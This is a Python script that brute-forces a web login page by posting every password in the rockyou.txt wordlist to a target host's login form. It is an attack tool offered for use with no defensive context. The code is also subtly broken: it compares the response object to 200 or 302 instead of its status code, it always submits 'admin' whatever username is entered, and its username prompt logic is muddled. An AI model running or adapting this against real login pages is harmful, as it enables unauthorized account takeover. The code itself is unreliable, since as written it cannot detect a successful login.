# brute force a login page
import requests
import os


def directory_login(host, login_page):
    # check if they have rockyou.txt
    if os.path.isfile("/usr/share/wordlists/rockyou.txt"):
        print("[*] rockyou.txt found")
    else:
        print("[*] rockyou.txt not found")
        return
    print("[*] do you know the username (Y/N)?")
    username = input("username: ")
    if username == "Y":
        print("[*] what is the username?")
        username = input("username: ")
    else:
        print("[*] using default username: admin")
        username = "admin"
    print("[*] what is the username field name?")
    username_field = input("username_field: ")
    print("[*] what is the password field name?")
    password_field = input("password_field: ")
    form = {username_field: "admin", password_field: "password"}
    with open("/usr/share/wordlists/rockyou.txt", "r") as f:
        for line in f:
            form[password_field] = line.strip()
            r = requests.post(host + login_page, data=form)
            if r == 200 or r == 302:
                print("[*] found password: " + line.strip())
                return
            else:
                continue
    f.close()
    return



